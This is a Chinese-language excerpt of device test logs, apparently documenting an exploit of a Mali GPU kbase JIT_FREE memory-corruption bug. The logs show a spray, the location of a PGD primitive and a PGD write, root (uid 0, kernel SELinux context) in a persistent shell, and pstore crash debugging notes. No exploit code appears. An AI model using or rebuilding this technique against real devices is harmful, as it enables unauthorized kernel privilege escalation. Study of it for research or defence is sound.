# 真机验证摘录

## 1. 分 CPU 并行 spray：TEST_MODE 通过

来源：`agm3_test_parallel_spray.log`。省略中间的 file-LRU 预热输出；其余关键顺序保持不变。

```text
[?] kbase UAPI version: 11.17
[+] jit_init ok (11.17 shape)
[+] reclaim detected at trial 1332: qrc=-1 commit=34342961152
[*] starting replacement spray
[stage] post-alias drain unmapped; submitting second JIT_FREE
[event] atom#1 code=1(0x1)
[event] atom#2 code=1(0x1)
[stage] second JIT_FREE completed; waiting for commit=0
[diag] post-free slot 10 commit=0
[+] replacement backing released in slot 10
[*] replacement released; reserved mappings created
[diag] slot 10 page 20 hits=2 entry256=2
[+] candidate slot 10 page 20 (2 pte-like entries)
[+] PGD FOUND AFTER MAP: gpu 7fe30e000 (slot 10 page 20)
[+] TEST PASSED — PGD primitive verified
```

这证明第二个目标 softjob event 已完成、replacement backing 的 commit 降为 0，且 PGD 候选是在 reserved mappings 建立之后才出现。

## 2. 幂等 PGD 写入通过

来源：`agm3_test_pgd_write_verify.log`。

```text
[*] TEST_MODE: idempotent PGD write verification enabled
[+] reclaim detected at trial 1068: qrc=-1 commit=34342961152
[event] atom#2 code=1(0x1)
[diag] post-free slot 63 commit=0
[+] replacement backing released in slot 63
[diag] slot 63 page 20 hits=2 entry256=2
[+] PGD FOUND AFTER MAP: gpu 7fe83b000 (slot 63 page 20)
[+] IDEMPOTENT PGD WRITE VERIFIED
[+] TEST PASSED — PGD primitive verified
```

此阶段向 entry 256 写回它的原值，再读取核对；没有把“发现候选”直接等同于“可写”。

## 3. FULL 获得 UID 0

来源：`agm3_full_attempt_2_actual.log`。

```text
[+] reclaim detected at trial 1306: qrc=-1 commit=34342961152
[event] atom#2 code=1(0x1)
[diag] post-free slot 61 commit=0
[+] replacement backing released in slot 61
[diag] slot 61 page 20 hits=2 entry256=2
[+] PGD FOUND AFTER MAP: gpu 7fe809000 (slot 61 page 20)
[*] enforce read result=0 errno=13
[*] uid after trigger: 0 euid: 0 (0 = root)
[+] ROOT (temporary, this process only)
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

后续通过 FIFO 向同一交互 shell 连续发送命令，收到 `ROOT_SHELL_READY`、`SECOND_CHECK`、`THIRD_CHECK`；对应 `id` 均返回 UID 0。由此确认它不是只打印一次 root 标记的退出进程。

## 4. pstore 排错结论

设备恢复后使用普通 ADB 权限运行 `/system/bin/bugreport`，从其中的 `/sys/fs/pstore/console-ramoops` 检查上一次内核崩溃。排错重点是：

```text
list_del corruption / list_add corruption
kbase_jit_free
kbase_free_alloced_region
kbase_gpu_munmap
kbase_mem_evictable_mark_reclaim
```

这些证据把故障收敛到第二次 `kbase_jit_free` 对失效 region/`jit_node` 的处理和 Mali context 生命周期。相应修复方向是分 CPU slab 替换、event/commit 屏障及谨慎处理 teardown，而不是无限增加内存压力。原始 bugreport 不进入开源仓库。
